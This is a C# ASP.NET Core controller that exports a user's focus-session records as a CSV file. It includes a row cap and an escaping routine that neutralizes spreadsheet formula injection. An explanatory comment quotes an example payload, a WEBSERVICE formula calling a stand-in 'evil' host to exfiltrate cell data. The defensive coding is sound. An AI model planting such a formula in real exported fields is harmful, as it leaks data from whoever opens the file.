using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Momentum.Api.Data;
using System.Security.Claims;
using System.Text;

namespace Momentum.Api.Controllers;

[ApiController]
[Route("api/v1/export")]
[Authorize]
public class ExportController : ControllerBase
{
    private readonly AppDbContext _db;
    public ExportController(AppDbContext db) => _db = db;
    private string UserId => User.FindFirstValue(ClaimTypes.NameIdentifier)!;

    // Keeps the whole export in a bounded amount of memory — beyond this, ask
    // the caller to narrow the date range rather than building an unbounded
    // in-memory CSV for a single request.
    private const int MaxExportRows = 50_000;

    [HttpGet("sessions")]
    public async Task<IActionResult> ExportSessions(
        [FromQuery] DateTime? from, [FromQuery] DateTime? to,
        [FromQuery] Guid? projectId, CancellationToken ct)
    {
        var query = _db.FocusSessions
            .Include(s => s.Project)
            .Include(s => s.SessionTags).ThenInclude(st => st.Tag)
            .Where(s => s.UserId == UserId);

        if (from.HasValue)      query = query.Where(s => s.StartedAt >= from.Value);
        if (to.HasValue)        query = query.Where(s => s.StartedAt <= to.Value);
        if (projectId.HasValue) query = query.Where(s => s.ProjectId == projectId.Value);

        if (await query.CountAsync(ct) > MaxExportRows)
            return BadRequest(new { error = $"Too many sessions to export at once (max {MaxExportRows}) — narrow the date range." });

        var sessions = await query.OrderByDescending(s => s.StartedAt)
            .AsNoTracking().ToListAsync(ct);

        var sb = new StringBuilder();
        sb.AppendLine("id,title,project,started_at,ended_at,duration_hours,energy_level,shipped,tags,notes");

        foreach (var s in sessions)
        {
            var duration = s.EndedAt.HasValue
                ? Math.Round((s.EndedAt.Value - s.StartedAt).TotalHours, 2).ToString("F2") : "";
            var tags  = string.Join("|", s.SessionTags.Select(st => st.Tag.Name));

            sb.AppendLine(string.Join(",",
                s.Id, EscapeCsvField(s.Title), EscapeCsvField(s.Project.Name),
                s.StartedAt.ToString("yyyy-MM-ddTHH:mm:ssZ"),
                s.EndedAt?.ToString("yyyy-MM-ddTHH:mm:ssZ") ?? "",
                duration, s.EnergyLevel, s.Shipped.ToString().ToLower(),
                EscapeCsvField(tags), EscapeCsvField(s.Notes ?? "")
            ));
        }

        var bytes    = Encoding.UTF8.GetBytes(sb.ToString());
        var fileName = $"momentum-sessions-{DateTime.UtcNow:yyyy-MM-dd}.csv";
        return File(bytes, "text/csv; charset=utf-8", fileName);
    }

    // Leading =, +, -, @ (or tab/CR) make spreadsheet apps (Excel, Google Sheets)
    // interpret the cell as a formula — e.g. a session titled
    // `=WEBSERVICE("http://evil/"&A1)` could exfiltrate data or run code when
    // the exported CSV is opened. Prefixing with a single quote neutralizes
    // this while leaving the value visually unchanged in a text editor.
    private static readonly char[] FormulaTriggerChars = ['=', '+', '-', '@', '\t', '\r'];

    private static string EscapeCsvField(string value)
    {
        if (value.Length > 0 && FormulaTriggerChars.Contains(value[0]))
            value = "'" + value;

        if (value.Contains(',') || value.Contains('"') || value.Contains('\n'))
            return $"\"{value.Replace("\"", "\"\"")}\"";
        return value;
    }
}